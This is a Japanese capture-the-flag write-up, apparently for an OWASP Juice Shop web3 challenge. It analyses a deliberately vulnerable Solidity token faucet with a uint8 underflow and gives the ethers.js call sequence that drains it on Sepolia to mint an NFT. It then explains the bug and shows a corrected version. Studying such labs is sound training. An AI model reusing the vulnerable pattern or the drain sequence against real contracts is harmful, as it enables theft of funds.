# Mint the Honey Pot ✅ (ソースコード分析完了)

**難易度:** ⭐⭐⭐
**カテゴリ:** Improper Input Validation
**目標:** BEEトークンを集めてHoney Pot NFTをミントする

## ソースコード分析

### スマートコントラクト

#### HoneyPotNFT (ERC721)

**ファイル:** `data/static/web3-snippets/HoneyPotNFT.sol`
**アドレス:** `0x41427790c94E7a592B17ad694eD9c06A02bb9C39` (Sepolia)

```solidity
contract HoneyPotNFT is ERC721, Ownable {
    IERC20 public token = IERC20(0x36435796Ca9be2bf150CE0dECc2D8Fab5C4d6E13);
    uint256 public constant mintPrice = 1000 * (10**18);  // 1000 BEE

    function mintNFT() external {
        token.transferFrom(msg.sender, address(this), mintPrice);
        _safeMint(msg.sender, totalSupply);
        totalSupply = totalSupply.add(1);
        emit NFTMinted(msg.sender, totalSupply - 1);
    }
}
```

#### BeeFaucet (脆弱なFaucet)

**ファイル:** `data/static/web3-snippets/BeeFaucet.sol`
**アドレス:** `0x860e3616aD0E0dEDc23352891f3E10C4131EA5BC` (Sepolia)

```solidity
contract BeeFaucet {
    Token public token = Token(0x36435796Ca9be2bf150CE0dECc2D8Fab5C4d6E13);
    uint8 public balance = 200;  // uint8 の脆弱性!

    function withdraw(uint8 amount) public {
        balance -= amount;  // アンダーフロー可能
        require(balance >= 0, "Withdrew more than the account balance!");
        token.transfer(msg.sender, uint256(amount) * 1000000000000000000);
    }
}
```

### 脆弱性: 整数アンダーフロー

`uint8` は 0-255 の範囲:
- balance = 50 で amount = 100 を引き出すと
- `uint8(50) - uint8(100) = 206` (アンダーフロー)
- `require(balance >= 0)` は常に true (unsigned)

### バックエンド実装

**ファイル:** `routes/nftMint.ts`

```typescript
const nftAddress = '0x41427790c94E7a592B17ad694eD9c06A02bb9C39'
const provider = new WebSocketProvider('wss://eth-sepolia.g.alchemy.com/v2/...')

// NFTMinted イベントをリッスン
contract.on('NFTMinted', (minter: string) => {
  addressesMinted.add(minter)
})

// チャレンジ検証
export function walletNFTVerify () {
  return (req: Request, res: Response) => {
    if (addressesMinted.has(req.body.walletAddress)) {
      challengeUtils.solveIf(challenges.nftMintChallenge, () => true)
    }
  }
}
```

## 実行手順

### 前提条件

1. MetaMask インストール済み
2. Sepolia テストネット接続
3. テスト用 ETH 保有 (ガス代用)

### Step 1: テスト ETH を取得

```
https://sepoliafaucet.com/
```

### Step 2: BEE トークンを取得

```javascript
// Faucet からトークンを引き出し
// uint8 アンダーフローを利用して多量に取得可能
await beeFaucet.withdraw(200);  // 200 BEE
await beeFaucet.withdraw(200);  // balance がアンダーフローして継続可能
// ... 1000 BEE まで繰り返し
```

### Step 3: BEE を Approve

```javascript
const beeToken = new ethers.Contract(BeeTokenAddress, BeeTokenABI, signer);
await beeToken.approve(nftAddress, ethers.parseUnits('1000', '18'));
```

### Step 4: NFT をミント

```javascript
const nft = new ethers.Contract(nftAddress, nftABI, signer);
await nft.mintNFT();
```

### Step 5: チャレンジ検証

```javascript
// バックエンドが NFTMinted イベントを検出後
fetch('/rest/web3/walletNFTVerify', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ walletAddress: myAddress })
});
```

## コントラクトアドレス一覧

| コントラクト | アドレス (Sepolia) |
|-------------|-------------------|
| HoneyPotNFT | `0x41427790c94E7a592B17ad694eD9c06A02bb9C39` |
| BeeToken | `0x36435796Ca9be2bf150CE0dECc2D8Fab5C4d6E13` |
| BeeFaucet | `0x860e3616aD0E0dEDc23352891f3E10C4131EA5BC` |

## 解説

### 整数アンダーフローとは？

**日常的な例えで説明すると:**

車の走行距離メーター（オドメーター）を想像してください。

```
999999 km → 次は → 000000 km (0に戻る!)
```

コンピュータの数値も同じ。`uint8` は 0〜255 の範囲しか表現できない。

```
  0 → 255 に戻る (アンダーフロー)
255 → 0 に戻る   (オーバーフロー)
```

### 攻撃の仕組み

```
┌─────────────────────────────────────────────────────┐
│              uint8 の数直線 (0〜255)                 │
├─────────────────────────────────────────────────────┤
│                                                     │
│  0 ←──────────── 50 ──────────────→ 255            │
│  ↑                │                   ↑            │
│  │                │                   │            │
│  └──── 50-100 ────┴───────────────────┘            │
│        = 206!     (0を通り越して255側から戻る)       │
│                                                     │
└─────────────────────────────────────────────────────┘

人間の計算: 50 - 100 = -50 (マイナス)
uint8の計算: 50 - 100 = 206 (プラス!)
```

### なぜ Faucet から無限にトークンを引き出せるか

```solidity
// Faucet のコード
uint8 public balance = 200;

function withdraw(uint8 amount) public {
    balance -= amount;  // ① まず引き算（アンダーフロー発生!）
    require(balance >= 0, "...");  // ② チェック（常にtrue!）
    token.transfer(msg.sender, amount * 10^18);  // ③ 送金
}
```

**攻撃シナリオ:**
```
初期状態: balance = 200

1回目: withdraw(200) → balance = 0
2回目: withdraw(1)   → balance = 0 - 1 = 255! (アンダーフロー)
3回目: withdraw(255) → balance = 0
... 無限に引き出せる!
```

### なぜ `require(balance >= 0)` が無意味か

| 型 | 表現できる範囲 | `>= 0` の結果 |
|----|--------------|--------------|
| int8 | -128 〜 127 | 負なら false |
| uint8 | 0 〜 255 | **常に true!** |

`uint8` は「符号なし」なので、定義上マイナスになれない。
アンダーフローしても 255 になるだけで、0 以上。

### 根本原因

1. **検証の順序が逆**: 引き算した後でチェックしても手遅れ
2. **型の選択ミス**: uint8 で `>= 0` をチェックしても無意味
3. **Solidity 0.8 以前の罠**: アンダーフローが自動検出されない

### 正しい実装

```solidity
// 正しい順序: 先にチェック、後で操作
function withdraw(uint256 amount) public {
    require(balance >= amount, "残高不足");  // ① 先にチェック
    balance -= amount;  // ② その後で引き算（安全）
    token.transfer(msg.sender, amount);
}
```

### このチャレンジの攻略

1. Faucet から BEE トークンを繰り返し引き出す（アンダーフロー悪用）
2. 1000 BEE を集める
3. NFT をミントする
4. チャレンジ解決!

### 対策

```solidity
// SafeMath を使用 (Solidity 0.8+ ではデフォルト)
using SafeMath for uint256;

// 適切な型を使用
uint256 public balance = 200;

// 引き出し前にチェック
require(balance >= amount, "Insufficient balance");
balance -= amount;
```

## 関連ファイル

| ファイル | 説明 |
|---------|------|
| `data/static/web3-snippets/HoneyPotNFT.sol` | NFT コントラクト |
| `data/static/web3-snippets/BeeFaucet.sol` | 脆弱な Faucet |
| `routes/nftMint.ts` | バックエンド検証 |
| `frontend/src/app/faucet/faucet.component.ts` | フロントエンド |

## ステータス

- [x] ソースコード分析完了
- [x] 脆弱性特定 (uint8 アンダーフロー)
- [x] 攻撃フロー理解
- [ ] MetaMask で実行 (環境依存)

## 参考リンク

- [Integer Overflow/Underflow](https://hackernoon.com/hack-solidity-integer-overflow-and-underflow)
- [Sepolia Faucet](https://sepoliafaucet.com/)
